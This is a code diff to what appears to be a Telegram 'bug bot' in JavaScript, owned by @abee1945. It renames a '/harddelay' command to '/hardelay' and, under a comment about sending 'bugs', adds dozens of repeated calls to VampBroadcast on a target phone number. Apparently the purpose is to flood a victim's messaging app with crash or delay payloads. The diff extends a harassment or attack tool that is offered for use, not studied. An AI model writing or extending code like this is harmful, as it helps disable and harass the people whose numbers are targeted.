@@ -1259,7 +1259,7 @@ Hellow I am Bot Ranz Tele ᯤ Ready to carry out the task  友
 ╭━━━━━━━━━━━━━━━━━━
 │ Owners : @abee1945
 ╭━━━━━━━━━━━━━━━━━
-│ 語  /delay
+│ 語  /hardelay
 │ 語  /bakios
 │ 語  /system
 │
@@ -1514,7 +1514,7 @@ bot.onText(/\/vampbeta(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/harddelay(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/hardelay(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -1545,7 +1545,57 @@ bot.onText(/\/harddelay(?:\s(.+))?/, async (msg, match) => {
     });
 
     // Proses pengiriman bug
-    for (let i = 0; i < 20; i++) { // Kirim 3 kali langsung
+    for (let i = 0; i < 2; i++) { // Kirim 3 kali langsung
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
         await VampBroadcast(formatedNumber);
         await VampBroadcast(formatedNumber);
         await VampBroadcast(formatedNumber);
@@ -2013,7 +2063,7 @@ bot.on("callback_query", async (callbackQuery) => {
 ╭━━━━━━━━━━━━━━━━━━
 │ Owners : @abee1945
 ╭━━━━━━━━━━━━━━━━━
-│ 語  /delay
+│ 語  /hardelay
 │ 語  /bakios
 │ 語  /system
 │
